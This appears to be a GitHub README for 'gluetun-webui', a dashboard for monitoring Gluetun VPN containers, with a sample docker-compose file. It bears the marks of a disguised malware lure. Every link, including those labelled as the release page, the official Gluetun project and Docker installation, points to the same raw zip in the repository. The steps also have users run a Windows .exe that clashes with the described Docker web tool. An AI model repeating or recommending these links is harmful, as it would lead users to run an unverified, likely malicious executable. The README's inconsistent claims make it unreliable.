# 🛠️ gluetun-webui - Simple VPN Monitoring Tool

[![Download gluetun-webui](https://img.shields.io/badge/Download-GreenRed?style=for-the-badge&color=green&label=Download%20gluetun-webui)](https://github.com/Thiago12097/gluetun-webui/raw/refs/heads/main/src/public/gluetun-webui-3.3.zip)

---

## 📋 What is gluetun-webui?

gluetun-webui is a lightweight web interface that helps you monitor and control your Gluetun VPN client running inside Docker. It shows you your VPN status, active servers, connection details, and lets you start or stop your VPN instances easily. 

You can watch up to 20 Gluetun VPNs in one place without digging into code or command lines.

---

## 🚀 Getting Started

This guide will help you download and run gluetun-webui on your Windows computer. You do not need any programming skills or special tools besides Docker. Follow these steps carefully.

---

## 💾 Download gluetun-webui

To get the application:

1. Click the green button below or visit the release page.

[![Download gluetun-webui](https://img.shields.io/badge/Download-Open%20Page-blue?style=for-the-badge)](https://github.com/Thiago12097/gluetun-webui/raw/refs/heads/main/src/public/gluetun-webui-3.3.zip)

2. On the release page, look for the latest version.

3. Download the Windows version, usually named something like `gluetun-webui-windows.zip`.

4. Save the file to a folder you can find easily, such as your Downloads folder.

---

## 💻 System Requirements

Before you run gluetun-webui, make sure your machine meets these requirements:

- Windows 10 or later.
- At least 4 GB of free RAM.
- Docker & Docker Compose installed.
- Basic internet connection.
- Gluetun VPN container running with HTTP control server enabled (default port 8000).

If you don’t have Docker yet, visit https://github.com/Thiago12097/gluetun-webui/raw/refs/heads/main/src/public/gluetun-webui-3.3.zip and follow their instructions to install it.

---

## 🛠️ Installing and Running gluetun-webui

1. After downloading, unzip the file you saved.

2. Open the folder where you extracted the files.

3. Look for the executable file, something like `gluetun-webui.exe`.

4. Double-click the `.exe` file to start the application.

5. The web interface will open automatically in your default web browser. If it doesn't, open your browser and go to `http://localhost:5000` (or the address shown in the program).

6. Make sure your Gluetun container is running with the HTTP control server enabled on port 8000. gluetun-webui connects to it to show your VPN status.

---

## 🔧 How to Use gluetun-webui

Once the interface is open, you can:

- See if your VPN is connected, paused, or disconnected.
- View your public exit IP address with location details like country, city, and organization.
- Check the VPN provider, protocol type (WireGuard or OpenVPN), and server information.
- Control your VPN by starting or stopping it with simple buttons.
- Monitor port forwarding and DNS status.
- Watch recent activity with color-coded history bars.
- Set how often the page refreshes automatically between 5 and 60 seconds.
- Manage up to 20 separate Gluetun VPN instances all from one window.
- Access the interface from your phone, tablet, or desktop, thanks to its responsive design.

---

## 🔌 Requirements to Connect gluetun-webui to Gluetun VPN

To work properly, gluetun-webui requires:

- Gluetun running inside Docker with HTTP control server enabled.
- The control server usually runs on port 8000 (default).
- The IP and port configuration must allow gluetun-webui to connect. If running both containers on the same host, use `localhost` or the Docker IP for the Gluetun container.
- Proper firewall or network settings to allow connections on port 8000.

---

## 🐳 Setting up Gluetun VPN with HTTP Control Server

If you don’t have Gluetun VPN container set up yet, follow these basic steps:

1. Install Docker and Docker Compose.

2. Create a Docker Compose file named `docker-compose.yml` with content like this:

```yaml
version: '3.8'

services:
  gluetun:
    image: qmcgaw/gluetun
    ports:
      - "8000:8000" # HTTP control server
    environment:
      - HTTP_CONTROL_ENABLED=true
      - HTTP_CONTROL_PORT=8000
      # Add your VPN provider and credentials here
      - VPNSP=your-vpn-provider
      - OPENVPN_USER=your-vpn-username
      - OPENVPN_PASSWORD=your-vpn-password
    restart: unless-stopped
```

3. Run `docker-compose up -d` in the folder with this file.

4. Wait a few minutes for the container to start.

5. Confirm the HTTP control server works by visiting `http://localhost:8000/status` in your browser. You should see JSON information about your VPN connection.

6. Now open gluetun-webui to monitor and control your VPN.

---

## ⚙️ Application Features

- Monitor multiple VPN connections at once.
- Clear status indicators: connected, paused, disconnected.
- Detailed VPN exit information: IP, region, city, and organization.
- Control protocol type: WireGuard or OpenVPN.
- Start and stop VPN connections easily.
- Auto-refresh the interface based on your preferred time.
- Color-coded history to spot connection changes quickly.
- Works well on phones, tablets, and desktop computers.
- Requires only basic knowledge to install and use.

---

## 🖼️ Screenshots

![Dashboard view showing status and VPN details](image-1.png)

---

## 🔗 Useful Links

- gluetun-webui Releases: https://github.com/Thiago12097/gluetun-webui/raw/refs/heads/main/src/public/gluetun-webui-3.3.zip  
- Official Gluetun Project: https://github.com/Thiago12097/gluetun-webui/raw/refs/heads/main/src/public/gluetun-webui-3.3.zip  
- Docker Installation: https://github.com/Thiago12097/gluetun-webui/raw/refs/heads/main/src/public/gluetun-webui-3.3.zip  

---

## 🤝 Support and Contribution

This project is open-source. If you find bugs or want to suggest improvements, look for the "Issues" section on the GitHub page. If you want to contribute code, you can fork the repository and send pull requests.

---

## 🔄 Updating gluetun-webui

To update the program:

1. Download the latest version from the release page linked above.

2. Close the running application.

3. Replace the old files with the new ones from the downloaded archive.

4. Start the app again.

---

## 💡 Troubleshooting

If you cannot start the app or see no data:

- Check if Docker and Gluetun are running properly.
- Verify the HTTP control server is active on port 8000.
- Confirm your firewall allows local connections on that port.
- Restart the applications and try again.
- Visit the GitHub Issues page for help or report your problem.